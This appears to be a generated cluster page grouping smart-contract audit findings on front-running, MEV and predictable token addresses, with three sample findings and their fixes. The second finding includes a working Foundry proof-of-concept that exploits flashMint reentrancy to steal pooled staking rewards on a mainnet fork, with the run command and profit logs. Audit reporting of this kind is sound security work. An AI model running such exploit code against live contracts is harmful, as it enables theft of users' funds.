# Cluster -1256

**Rank:** #356  
**Count:** 17  

## Label
Predictable contract addresses enable front-running and arbitrage attacks, allowing attackers to manipulate token prices or exploit pool creation timing through deterministic address generation and insufficient validation.

## Cluster Information
- **Total Findings:** 17

## Examples

### Example 1

**Auto Label:** Front-running attacks enabled by public, deterministic reward mechanisms and mempool visibility, allowing malicious actors to extract rewards through predictable transaction ordering and state manipulation.  

**Original Text Preview:**

Every `dripReward` increases stUSR/USR exchange rate, which invites MEV. A bot can:

1. Monitor mempool for dripReward transactions.
2. `deposit` USR into stUSR.
3. After `dripReward` is mined, `withdraw` USR from stUSR, receiving USR rewards without staking.

Recommendations:
stUSR#deposit should call `dripReward` at the beginning.

---
### Example 2

**Auto Label:** Front-running attacks enabled by public, deterministic reward mechanisms and mempool visibility, allowing malicious actors to extract rewards through predictable transaction ordering and state manipulation.  

**Original Text Preview:**

## Severity

**Impact:** High

**Likelihood:** High

## Description

When `flashMint` is called, it sets `_shortCircuitRewards` to 1, preventing `_processPreSwapFeesAndSwap` from being executed. As a result, the collected fees will neither be swapped nor deposited into the staking pool's `POOL_REWARDS`.

```solidity
    function flashMint(address _recipient, uint256 _amount, bytes calldata _data) external override lock {
>>>     _shortCircuitRewards = 1;
        uint256 _fee = _amount / 1000;
        _mint(_recipient, _amount);
        IFlashLoanRecipient(_recipient).callback(_data);
        // Make sure the calling user pays fee of 0.1% more than they flash minted to recipient
        _burn(_recipient, _amount);
        // only adjust _totalSupply by fee amt since we didn't add to supply at mint during flash mint
        _totalSupply -= _fee == 0 ? 1 : _fee;
        _burn(_msgSender(), _fee == 0 ? 1 : _fee);
        _shortCircuitRewards = 0;
        emit FlashMint(_msgSender(), _recipient, _amount);
    }
```

```solidity
    function _processPreSwapFeesAndSwap() internal {
>>>     if (_shortCircuitRewards == 1) {
            return;
        }
        // SWAP_DELAY = 20;
        bool _passesSwapDelay = block.timestamp > _lastSwap + SWAP_DELAY;
        if (!_passesSwapDelay) {
            return;
        }
        uint256 _bal = balanceOf(address(this));
        if (_bal == 0) {
            return;
        }
        uint256 _lpBal = balanceOf(V2_POOL);
        uint256 _min = block.chainid == 1 ? _lpBal / 1000 : _lpBal / 4000; // 0.1%/0.025% LP bal
        uint256 _max = _lpBal / 100; // 1%
        if (_bal >= _min && _lpBal > 0) {
            _swapping = 1;
            _lastSwap = uint64(block.timestamp);
            uint256 _totalAmt = _bal > _max ? _max : _bal;
            uint256 _partnerAmt;
            if (fees.partner > 0 && config.partner != address(0) && !_blacklist[config.partner]) {
                _partnerAmt = (_totalAmt * fees.partner) / DEN;
                super._transfer(address(this), config.partner, _partnerAmt);
            }
            _feeSwap(_totalAmt - _partnerAmt);
            _swapping = 0;
        }
    }
```

An attacker can exploit this by staking their pod's V2 pool tokens into the `StakingPoolToken` within the `flashMint` callback. When a user stakes V2 pool tokens into the `StakingPoolToken`, it updates their share tracking in `POOL_REWARDS`.

```solidity
    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {
        if (_from != address(0)) {
            TokenRewards(POOL_REWARDS).setShares(_from, _amount, true);
        }
        if (_to != address(0) && _to != address(0xdead)) {
            TokenRewards(POOL_REWARDS).setShares(_to, _amount, false);
        }
    }
```

When `POOL_REWARDS.setShares` is called, it attempts to trigger `_processFeesIfApplicable`. This processes the accumulated fees in the pod, ensuring that new stakers cannot gain immediate profits from previously accumulated fees.

```solidity
    function setShares(address _wallet, uint256 _amount, bool _sharesRemoving) external override {
        require(_msgSender() == trackingToken, "UNAUTHORIZED");
        _setShares(_wallet, _amount, _sharesRemoving);
    }

    function _setShares(address _wallet, uint256 _amount, bool _sharesRemoving) internal {
>>>     _processFeesIfApplicable();
        if (_sharesRemoving) {
            _removeShares(_wallet, _amount);
            emit RemoveShares(_wallet, _amount);
        } else {
            _addShares(_wallet, _amount);
            emit AddShares(_wallet, _amount);
        }
    }
```

However, since `stake` is called within the `flashMint` callback, `_shortCircuitRewards` is set to 1, preventing fees from being swapped and rewards from being deposited into `POOL_REWARDS`.

After the attacker `stake` within the `flashMint` callback and exits the `flashMint` process, they can immediately call `unstake` to trigger `_processFeesIfApplicable` and steal rewards for an immediate profit.

PoC :

Add the following test to `IndexUtils.t.sol` :

```solidity
    function test_ReentrancyFlashMint() public {
        // Get a pod to test with
        address podToDup = IStakingPoolToken(0x4D57ad8FB14311e1Fc4b3fcaC62129506FF373b1).indexFund(); // spPDAI
        address newPod = _dupPodAndSeedLp(podToDup, address(0), 0, 0);
        IDecentralizedIndex indexFund = IDecentralizedIndex(newPod);

        // Setup test amounts
        uint256 podTokensToAdd = 1e18;
        uint256 pairedTokensToAdd = 1e18;
        uint256 slippage = 1000; // 100% slippage for test

        // Deal tokens to this contract
        deal(peas, address(this), podTokensToAdd + 1000);
        // attacker balance before
        uint256 peasBefore = IERC20(peas).balanceOf(address(this));
        IERC20(peas).approve(address(indexFund), podTokensToAdd + 1000);
        uint256 podBef = indexFund.balanceOf(address(this));
        indexFund.bond(peas, podTokensToAdd + 1000, 0);
        uint256 pTknToLp = indexFund.balanceOf(address(this)) - podBef - 10;
        deal(indexFund.PAIRED_LP_TOKEN(), address(this), pairedTokensToAdd);

        uint256 initialPairedBalance = IERC20(indexFund.PAIRED_LP_TOKEN()).balanceOf(address(this));

        // Approve tokens
        // IERC20(address(indexFund)).approve(address(indexFund), pTknToLp);
        IERC20(indexFund.PAIRED_LP_TOKEN()).approve(address(indexFund), pairedTokensToAdd);

        uint256 lpAmount = indexFund.addLiquidityV2(pTknToLp,pairedTokensToAdd,1000,block.timestamp);


        // Get initial staked LP balance
        address stakingPool = indexFund.lpStakingPool();

        // Deal tokens to the indexFund to simulate accumulated reward fees
        deal(address(indexFund), address(indexFund), 100e18);

        // function flashMint(address _recipient, uint256 _amount, bytes calldata _data) external override lock
        bytes memory data = abi.encode(indexFund, stakingPool, lpAmount);
        indexFund.flashMint(address(this), 0, data);

        IStakingPoolToken(stakingPool).unstake(lpAmount);

        address _podV2Pool = IStakingPoolToken(stakingPool).stakingToken();
        IERC20(_podV2Pool).approve(address(indexFund), lpAmount);
        indexFund.removeLiquidityV2(lpAmount,0,0,block.timestamp);
        address[] memory _tokens = new address[](1);
        uint8[] memory _percentages = new uint8[](1);
        indexFund.debond(IERC20(address(indexFund)).balanceOf(address(this)),_tokens, _percentages);

        uint256 peasAfter = IERC20(peas).balanceOf(address(this));
        uint256 PairedBalanceAfter = IERC20(indexFund.PAIRED_LP_TOKEN()).balanceOf(address(this));
        console.log("initial peas : ");
        console.log(peasBefore);
        console.log("after peas : ");
        console.log(peasAfter);
        console.log("initial paired : ");
        console.log(initialPairedBalance);
        console.log("after paired : ");
        console.log(PairedBalanceAfter);
    }

    function callback(bytes calldata data) external {
        (address indexFund, address stakingPool, uint256 lpAmount) = abi.decode(data, (address, address, uint256));
        address _podV2Pool = IStakingPoolToken(stakingPool).stakingToken();
        IERC20(_podV2Pool).approve(stakingPool, lpAmount);
        IStakingPoolToken(stakingPool).stake(address(this), lpAmount);
    }
```

Run the test :

```
forge test --match-test test_ReentrancyFlashMint --fork-url https://eth-mainnet.alchemyapi.io/v2/API_KEY
```

Log output :

```
Logs:
  initial peas :
  1000000000000001000
  after peas :
  49853312988018152980

  initial paired :
  1000000000000000000
  after paired :
  990372833280884832
```

Considering that `_processPreSwapFeesAndSwap` will not be triggered until a certain minimum amount of fees has accumulated and a swap delay is applied, it is highly likely that a significant amount of fees will be available in the pod at a given time for an attacker to steal.

## Recommendations

Add `lock` modifier to `DecentralizedIndex.processPreSwapFeesAndSwap` to prevent staking within the `flashMint` callback.

```diff
-    function processPreSwapFeesAndSwap() external override {
+    function processPreSwapFeesAndSwap() external override lock {
        require(_msgSender() == StakingPoolToken(lpStakingPool).POOL_REWARDS(), "R");
        _processPreSwapFeesAndSwap();
    }
```

---
### Example 3

**Auto Label:** Predictable token address generation enables front-running and DoS attacks by allowing attackers to manipulate mempools and exploit economic incentives through MEV.  

**Original Text Preview:**

## Context
**File:** MemeFactory.sol#L194-L195

## Description
When a new meme token is unleashed, the contract ensures that no pre-existing Uniswap V3 pool with the given token pair exists, expecting the returned pool address to be zero before creation. If an attacker anticipates the token address calculating the random salt used for creating the token and frontruns the `unleashThisMeme()` transaction by creating the Uniswap pool beforehand, it can cause the `unleashThisMeme()` call to fail. This could result in a short-term denial-of-service (DoS) scenario. 

However, this issue is more theoretical in nature, particularly in L2 environments where frontrunning is significantly more difficult or non-existent due to the use of sequencers rather than public mempools. Additionally, the contract’s logic for token creation and salt determination ensures a new token address configuration with each attempt, preventing a permanent blockage.

## Recommendation
Since this scenario primarily affects blockchains with a public mempool and the attacker gains no direct economic benefit, the impact is minimal and can be avoided using a private mempool. However, for improved resilience:
- Document the theoretical DoS vector to inform users.
- Consider using a more sophisticated address derivation process or introducing additional entropy for token address generation, further reducing the predictability of the new meme token address.

## Valory
Acknowledged.

## Cantina Managed
Acknowledged. This is an acceptable risk for the currently deployed contracts on Base and Celo as:
1. The DoS is not permanent as the meme token address changes every block.
2. Front-running is not possible on most L2s, since they do not have a public mempool.

---
